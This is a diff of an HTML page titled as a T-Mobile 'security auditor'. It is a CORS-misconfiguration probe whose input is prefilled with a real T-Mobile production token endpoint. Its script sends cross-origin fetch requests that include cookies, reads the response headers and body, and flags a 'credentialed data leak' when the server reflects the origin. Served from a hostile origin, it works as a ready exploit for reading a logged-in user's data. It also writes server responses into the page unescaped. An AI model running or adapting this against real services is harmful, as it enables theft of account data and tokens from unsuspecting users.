@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>T-Mobile Internal Auditor PoC</title>
+    <title>T-Mobile Security Auditor v2</title>
     <style>
         body { font-family: 'Segoe UI', sans-serif; background: #0b0e11; color: #e1e1e1; padding: 20px; line-height: 1.6; }
         .wrapper { max-width: 900px; margin: auto; }
@@ -10,18 +10,25 @@
         h1 { color: #e20074; margin-top: 0; border-bottom: 2px solid #e20074; padding-bottom: 10px; }
         
         .form-group { margin-bottom: 15px; }
-        input, select { width: 100%; padding: 12px; background: #2d333b; border: 1px solid #444c56; color: white; border-radius: 5px; box-sizing: border-box; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; color: #8b949e; }
+        input, select { width: 100%; padding: 12px; background: #2d333b; border: 1px solid #444c56; color: white; border-radius: 5px; box-sizing: border-box; font-family: monospace; }
         
-        button { background: #e20074; color: white; border: none; padding: 12px 25px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; }
-        button:hover { background: #ff0084; }
+        .btn-container { display: flex; gap: 10px; margin-top: 10px; }
+        .btn-fire { background: #e20074; color: white; border: none; padding: 15px; border-radius: 5px; font-weight: bold; cursor: pointer; flex: 2; font-size: 16px; text-transform: uppercase; }
+        .btn-clear { background: #444c56; color: white; border: none; padding: 15px; border-radius: 5px; font-weight: bold; cursor: pointer; flex: 1; font-size: 14px; }
+        button:hover { opacity: 0.9; }
 
-        #auditLog { background: #0d1117; border-radius: 5px; padding: 15px; height: 400px; overflow-y: auto; font-family: 'Consolas', monospace; font-size: 13px; border: 1px solid #30363d; }
-        .log-entry { padding: 10px; border-bottom: 1px solid #30363d; margin-bottom: 5px; }
+        #auditLog { background: #0d1117; border-radius: 5px; padding: 15px; height: 450px; overflow-y: auto; font-family: 'Consolas', monospace; font-size: 13px; border: 1px solid #30363d; margin-top: 10px; }
+        .log-entry { padding: 10px; border-bottom: 1px solid #30363d; margin-bottom: 5px; animation: fadeIn 0.3s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
+
         .tag { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; margin-right: 10px; text-transform: uppercase; }
         .tag-fail { background: #da3633; color: white; }
         .tag-success { background: #238636; color: white; }
         .tag-info { background: #1f6feb; color: white; }
+        
         .vuln-alert { color: #f85149; font-weight: bold; background: rgba(248, 81, 73, 0.1); padding: 10px; border: 1px dashed #f85149; margin-top: 10px; display: block; }
+        .data-preview { color: #8b949e; background: #161b22; padding: 5px; border-radius: 3px; display: block; margin-top: 5px; word-break: break-all; }
     </style>
 </head>
 <body>
@@ -29,13 +36,102 @@
 <div class="wrapper">
     <div class="card">
         <h1>T-Mobile Security Auditor</h1>
-        <p>Testing from: <strong><script>document.write(window.location.origin)</script></strong></p>
+        <p>Testing from origin: <code style="color:#58a6ff"><script>document.write(window.location.origin)</script></code></p>
         
         <div class="form-group">
-            <label>Endpoint URL:</label>
+            <label>Endpoint URL (from Burp Site Map):</label>
             <input type="text" id="targetUrl" placeholder="https://api.t-mobile.com/..." value="https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens">
         </div>
 
         <div style="display: flex; gap: 10px;" class="form-group">
-            <select id="method" style="flex: 1;">
-                <option value="GET">GET</option>
+            <div style="flex: 1;">
+                <label>Method:</label>
+                <select id="method">
+                    <option value="GET">GET</option>
+                    <option value="POST">POST</option>
+                </select>
+            </div>
+            <div style="flex: 1;">
+                <label>Credentials:</label>
+                <select id="creds">
+                    <option value="include">Include Cookies</option>
+                    <option value="omit">No Cookies</option>
+                </select>
+            </div>
+        </div>
+
+        <div class="btn-container">
+            <button class="btn-fire" onclick="fireAudit()">Execute Audit</button>
+            <button class="btn-clear" onclick="clearLog()">Clear Log</button>
+        </div>
+    </div>
+
+    <div class="card" style="padding: 10px;">
+        <h3 style="margin-left: 15px;">Live Audit Log</h3>
+        <div id="auditLog">--- Log Initialized. Awaiting your first test ---</div>
+    </div>
+</div>
+
+<script>
+    const logBox = document.getElementById('auditLog');
+
+    function clearLog() {
+        logBox.innerHTML = "--- Log Cleared ---";
+    }
+
+    function addLog(type, message, status = null) {
+        if(logBox.innerText.includes("Log Initialized") || logBox.innerText.includes("Log Cleared")) logBox.innerHTML = "";
+        
+        const div = document.createElement('div');
+        div.className = 'log-entry';
+        const tagClass = type === 'success' ? 'tag-success' : (type === 'fail' ? 'tag-fail' : 'tag-info');
+        
+        div.innerHTML = `
+            <div>
+                <span class="tag ${tagClass}">${type}</span> 
+                [${new Date().toLocaleTimeString()}] ${status ? 'Status: ' + status : ''}
+            </div>
+            <div style="margin-top:5px;">${message}</div>
+        `;
+        logBox.prepend(div);
+    }
+
+    async function fireAudit() {
+        const url = document.getElementById('targetUrl').value;
+        const method = document.getElementById('method').value;
+        const credentials = document.getElementById('creds').value;
+
+        addLog('info', `Probing: ${url}...`);
+
+        try {
+            const response = await fetch(url, {
+                method: method,
+                mode: 'cors',
+                credentials: credentials,
+                headers: { 'Content-Type': 'application/json' },
+                body: method === 'POST' ? JSON.stringify({}) : null
+            });
+
+            const acao = response.headers.get('Access-Control-Allow-Origin');
+            const acac = response.headers.get('Access-Control-Allow-Credentials');
+            const body = await response.text();
+
+            let message = `<b>ACAO:</b> ${acao || 'None reflected'}<br><b>ACAC:</b> ${acac || 'None'}<br>
+                           <b>Data Preview:</b> <span class="data-preview">${body.substring(0, 150) || 'Empty Response'}</span>`;
+            
+            // Check for the "Jackpot" condition
+            if (acao && (acao === '*' || acao.includes(window.location.hostname)) && acac === 'true') {
+                message += `<span class="vuln-alert">VULNERABILITY CONFIRMED: Credentialed Data Leak!</span>`;
+                addLog('success', message, response.status);
+            } else {
+                addLog('info', message, response.status);
+            }
+
+        } catch (err) {
+            addLog('fail', `<b>CORS Blocked:</b> ${err.message}<br><small>The server rejected your origin. No data leaked.</small>`);
+        }
+    }
+</script>
+
+</body>
+</html>
